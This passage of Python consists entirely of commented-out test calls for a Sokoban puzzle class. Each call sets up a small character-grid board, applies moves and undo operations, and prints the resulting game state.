# game = Sokoban(board)
# print(game)
# print(SEPARATOR)
# board = [
#     ['*', '*', '*', '*', '*'],
#     ['*', 'o', ' ', ' ', '*'],
#     ['#', ' ', 'P', '#', 'o'],
#     ['*', ' ', ' ', ' ', '*'],
#     ['*', '*', '*', '*', '*'],
# ]
# game = Sokoban(board)
# print(game)
# print(SEPARATOR)
# board = [
#     ['*', '*', '*', '*', '*'],
#     ['*', '*', '*', '*', '*'],
#     ['*', '*', 'P', '*', '*'],
#     ['*', '*', '*', '*', '*'],
#     ['*', '*', '*', '*', '*'],
# ]
# game = Sokoban(board)
# print(game)
# print(SEPARATOR)
# board = [
#     ['*', '*', '*', '*', '*', '*', '*', '*'],
#     ['*', ' ', ' ', ' ', ' ', ' ', ' ', '*'],
#     ['*', 'P', ' ', '#', ' ', ' ', ' ', '*'],
#     ['*', '*', '*', '*', '*', ' ', '#', '*'],
#     ['*', 'o', ' ', ' ', ' ', ' ', ' ', '*'],
#     ['*', ' ', ' ', ' ', ' ', ' ', 'o', '*'],
#     ['*', '*', '*', '*', '*', '*', '*', '*']
# ]
# game = Sokoban(board)
# moves = 'dddduwdsssuwdsssuaaaa'
# for move in moves:
#     if move == 'u':
#         game.undo()
#         print(game)
#     else:
#         game.move(move)
# print(game)
# print(SEPARATOR)
# board = [
#     ['*', '*', '*', '*', '*'],
#     ['*', 'o', ' ', ' ', '*'],
#     ['#', ' ', 'P', '#', 'o'],
#     ['*', ' ', ' ', ' ', '*'],
#     ['*', '*', '*', '*', '*'],
# ]
# game = Sokoban(board)
# game.undo()
# print(game)
# print(SEPARATOR)
# board = [
#     ['*', '*', '*', '*', '*'],
#     ['*', 'o', ' ', ' ', '*'],
#     ['#', ' ', 'P', '#', 'o'],
#     ['*', ' ', ' ', ' ', '*'],
#     ['*', '*', '*', '*', '*'],
# ]
# game = Sokoban(board)
# game.move('w')
# game.undo()
# print(game)
# print(SEPARATOR)
# board = [
#     ['*', '*', '*', '*', '*'],
#     ['*', 'o', ' ', ' ', '*'],
#     ['#', ' ', 'P', '#', ' '],
#     ['*', ' ', ' ', ' ', '*'],
#     ['*', '*', '*', '*', '*'],
# ]
# game = Sokoban(board)
# game.move('d')
# game.undo()
# print(game)
# print(SEPARATOR)
# board = [
#     ['*', '*', '*', '*', '*'],
#     ['*', 'o', ' ', ' ', '*'],
#     ['#', ' ', 'P', '#', 'o'],
#     ['*', ' ', ' ', ' ', '*'],
#     ['*', '*', '*', '*', '*'],
# ]
# game = Sokoban(board)
# game.move('d')
# game.undo()
# print(game)
# print(SEPARATOR)
# board = [
#     ['*', '*', '*', '*', '*'],
#     ['*', 'o', ' ', ' ', '*'],
#     ['#', ' ', 'P', '#', 'o'],
#     ['*', ' ', ' ', ' ', '*'],
#     ['*', '*', '*', '*', '*'],
# ]
# game = Sokoban(board)
# game.move('w')
# game.move('w')
# game.move('w')
# game.move('w')
# game.move('w')
# game.undo()
# print(game)